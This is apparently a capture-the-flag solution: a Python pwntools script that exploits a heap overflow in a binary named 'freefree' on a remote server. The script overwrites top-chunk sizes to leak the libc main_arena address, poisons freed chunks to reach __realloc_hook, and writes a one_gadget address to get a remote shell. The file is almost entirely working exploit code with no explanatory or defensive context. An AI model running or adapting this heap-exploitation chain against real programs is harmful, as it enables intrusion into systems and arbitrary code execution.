import subprocess
import time
import string
from pwn import *

libc = ELF('./libc-2.31.so', checksec=False)
context.binary = exe = ELF('./freefree', checksec=False)
# context.log_level = 'debug'
libc.sym['one_gadget'] = 0xe6aee
libc.sym['main_arena'] = 0x1ec1e0

def getchar(index):
	return string.ascii_uppercase[index]

def malloc(index, num):
	p.sendlineafter(b'> ', '{}=malloc({})'.format(getchar(index), num).encode())

def gets(index, data):
	p.sendlineafter(b'> ', 'gets({})'.format(getchar(index)).encode())
	time.sleep(0.1)
	p.sendline(data)

def puts(index):
	p.sendlineafter(b'> ', 'puts({})'.format(getchar(index)).encode())
	# Receive data outside

def GDB():
	command='''
	b*main+98
	b*main+215
	b*main+226
	b*main+316
	c
	'''
	# b*sysmalloc
	with open('/tmp/command.gdb', 'wt') as f:
	        f.write(command)
	subprocess.Popen(['/usr/bin/x-terminal-emulator', '-e', 'gdb', '-p', str(p.pid), '-x', '/tmp/command.gdb'])
	input()         # input() to make program wait with gdb

# p = process('./freefree_patched')
p = connect('34.136.108.210', 40007)
n = 10

########################################
### Stage 1: Leak main arena address ###
########################################
log.info('Stage 1: Leak main arena address...')
# Malloc to control all next chunks
malloc(0+n, 0x10)

# Change top chunk size
payload = b'\x00'*0x10    # chunk data
payload += b'\x00'*0x8    # Prevsize
payload += p64(0xd51)
gets(0+n, payload)

# Trigger to free top chunl
malloc(1+n, 0x1000)

# Malloc to get libc main arena address
malloc(2+n, 0x100)
puts(2+n)
libc_main_arena = u64(p.recvline()[:-1] + b'\x00\x00')
log.success('Libc main_arena: ' + hex(libc_main_arena))
libc.address = libc_main_arena - libc.sym['main_arena']
log.success('Libc main_arena: ' + hex(libc.address))

####################################
### Stage 2: Free 2 small chunks ###
####################################
log.info('Stage 2: Free 2 small chunks...')
# First freed chunk
# Change top chunk size to 0x20300
malloc(1+n, 0xcf0-0x10)

# Overwrite top chunk size to 0x300
payload = b'\x00'* (0xcf0-0x10)
payload += b'\x00'*8
payload += p64(0x301)
gets(1+n, payload)

# Trigger to free top chunk
malloc(2+n, 0x1000)


# Second freed chunk
# Change top chunk size to 0x20300
malloc(2+n, 0xcf0-0x10)

# Overwrite top chunk size to 0x300
payload = b'\x00'* (0xcf0-0x10)
payload += b'\x00'*8
payload += p64(0x301)
gets(2+n, payload)

# Trigger to free top chunk
malloc(3+n, 0x1000)

##########################
### Stage 3: Get shell ###
##########################
log.info('Stage 3: Get shell...')
payload = b'\x00'* (0xcf0-0x10)
payload += b'\x00'*8    # Prevsize
payload += p64(0x2e1)
payload += p64(libc.sym['__realloc_hook'])
gets(2+n, payload)

malloc(3+n, 0x2e0-0x10)
malloc(3+n, 0x2e0-0x10)

payload = p64(libc.address + 0xe6aee)
payload += p64(libc.sym['realloc'] + 24)
gets(3+n, payload)

malloc(4+n, 0x10)

p.interactive()